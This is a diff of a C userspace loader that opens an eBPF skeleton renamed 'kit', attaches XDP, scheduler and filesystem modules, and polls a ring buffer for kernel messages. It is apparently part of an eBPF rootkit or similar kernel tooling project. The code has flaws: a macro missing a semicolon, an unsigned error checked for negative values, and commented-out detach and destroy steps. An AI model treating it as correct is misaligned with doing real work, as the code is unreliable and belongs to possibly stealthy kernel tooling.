@@ -8,16 +8,31 @@
 #include <net/if.h>
 #include <unistd.h>
 
-#include "xdp_filter.skel.h"
-#include "xdp_filter.h"
-#include "../constants/constants.h"
+#include <bpf/bpf.h>
+
+#include "kit.skel.h"
+
+#include "../common/constants.h"
+#include "../common/map_common.h"
+#include "include/utils/files/path.h"
+#include "include/utils/strings/regex.h"
+#include "include/utils/structures/fdlist.h"
+#include "include/modules/module_manager.h"
+
+#define ABORT_IF_ERR(err, msg)\
+	if(err<0){\
+		fprintf(stderr, msg);\
+		goto cleanup\
+	}
+
 
 static struct env {
 	bool verbose;
 } env;
 
 void print_help_dialog(const char* arg){
-    printf("\nUsage: %s ./xdp_filter OPTION\n\n", arg);
+	
+    printf("\nUsage: %s ./kit OPTION\n\n", arg);
     printf("Program OPTIONs\n");
     char* line = "-t[NETWORK INTERFACE]";
     char* desc = "Activate XDP filter";
@@ -60,29 +75,58 @@ static void sig_handler(int sig){
 	exiting = true;
 }
 
-/*static int handle_event(void *ctx, void *data, size_t data_sz){
-	const struct event *e = data;
+/**
+ * @brief Manages an event received via the ring buffer
+ * It's a message from th ebpf program
+ * 
+ * @param ctx 
+ * @param data 
+ * @param data_sz 
+ * @return int 
+ */
+static int handle_rb_event(void *ctx, void *data, size_t data_size){
+	const struct rb_event *e = data;
+
+	//For time displaying
 	struct tm *tm;
 	char ts[32];
 	time_t t;
-
 	time(&t);
 	tm = localtime(&t);
 	strftime(ts, sizeof(ts), "%H:%M:%S", tm);
 
-    printf("NEW: %s\n",
-            e->payload);
+
+    if(e->event_type == INFO){
+		printf("%s INFO  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
+	}else if(e->event_type == DEBUG){
+
+	}else if(e->event_type == ERROR){
+
+	}else if(e->event_type == EXIT){
+
+	}else{
+		printf("UNRECOGNIZED RB EVENT RECEIVED");
+		return -1;
+	}
 
 	return 0;
-}*/
+}
 
 
 int main(int argc, char**argv){
-    //struct ring_buffer *rb = NULL;
-    struct xdp_filter_bpf *skel;
-    int err;
+    struct ring_buffer *rb = NULL;
+    struct kit_bpf *skel;
+    __u32 err;
+
+	//Ready to be used
+	/*for (int arg = 1; arg < argc; arg++) {
+		if (load_fd_kmsg(argv[arg])) {
+			fprintf(stderr, "%s.\n", strerror(errno));
+			return EXIT_FAILURE;
+		}
+	}*/
 	
-	unsigned int ifindex; 
+	__u32 ifindex; 
 
 	/* Parse command line arguments */
 	int opt;
@@ -120,58 +164,83 @@ int main(int argc, char**argv){
         }
     }
 	
-	// Set up libbpf errors and debug info callback
+	//Set up libbpf errors and debug info callback
 	libbpf_set_print(libbpf_print_fn);
 
 	// Bump RLIMIT_MEMLOCK to be able to create BPF maps
 	bump_memlock_rlimit();
 
-	// Cleaner handling of Ctrl-C
+	//Cleaner handling of Ctrl-C
 	signal(SIGINT, sig_handler);
 	signal(SIGTERM, sig_handler);
 
-    // Load and verify BPF application
-	skel = xdp_filter_bpf__open();
+    //Open and create BPF application in the kernel
+	skel = kit_bpf__open();
 	if (!skel) {
 		fprintf(stderr, "Failed to open and load BPF skeleton\n");
 		return 1;
 	}
 
-	// Load & verify BPF programs */
-	err = xdp_filter_bpf__load(skel);
+	//Load & verify BPF program
+	err = kit_bpf__load(skel);
 	if (err) {
 		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
 		goto cleanup;
 	}
 
-    // Attach tracepoints
-	/*err = xdp_filter_bpf__attach(skel);
-	if (err) {
-		fprintf(stderr, "Failed to attach BPF skeleton\n");
+	//Attach XDP and sched modules using module manager
+	//and setup the parameters for the installation
+	//XDP
+	module_config.xdp_module.all = ON;
+	module_config_attr.xdp_module.flags = XDP_FLAGS_REPLACE;
+	module_config_attr.xdp_module.ifindex = ifindex;
+	//SCHED
+	module_config.sched_module.all = ON;
+	//FS
+	module_config.fs_module.all = ON;
+	
+	module_config_attr.skel = skel;
+	err = setup_all_modules();
+	// Set up ring buffer polling --> Main communication buffer kernel->user
+	rb = ring_buffer__new(bpf_map__fd(skel->maps.rb_comm), handle_rb_event, NULL, NULL);
+	if (rb==NULL) {
+		err = -1;
+		fprintf(stderr, "Failed to create ring buffer\n");
 		goto cleanup;
-	}*/
+	}
 
-	//Attack BPF program to network interface
-	int flags = XDP_FLAGS_SKB_MODE;
-    int fd = bpf_program__fd(skel->progs.xdp_receive);
-    err = bpf_set_link_xdp_fd(ifindex, fd, flags);
-
+	//Now wait for messages from ebpf program
 	printf("Filter set and ready\n");
 	while (!exiting) {
-		/* trigger our BPF program */
-		fprintf(stderr, ".");
-		sleep(1);
+		err = ring_buffer__poll(rb, 100 /* timeout, ms */);
+		
+		//Checking if a signal occured
+		if (err == -EINTR) {
+			err = 0;
+			break;
+		}
+		if (err < 0) {
+			printf("Error polling ring buffer: %d\n", err);
+			break;
+		}
 	}
 
 	//Received signal to stop, detach program from network interface
-	fd = -1;
-    err = bpf_set_link_xdp_fd(ifindex, fd, flags);
+	/*err = detach_sched_all(skel);
+	if(err<0){
+		perror("ERR");
+		goto cleanup;
+	}
+	detach_xdp_all(skel);
+	if(err<0){
+		perror("ERR");
+		goto cleanup;
+	}*/
 
-
-    cleanup:
-        xdp_filter_bpf__destroy(skel);
-
-        return err < 0 ? -err : 0;
+cleanup:
+	ring_buffer__free(rb);
+	//kit_bpf__destroy(skel);
+	if(err!=0) return -1;
 
     return 0;
 }
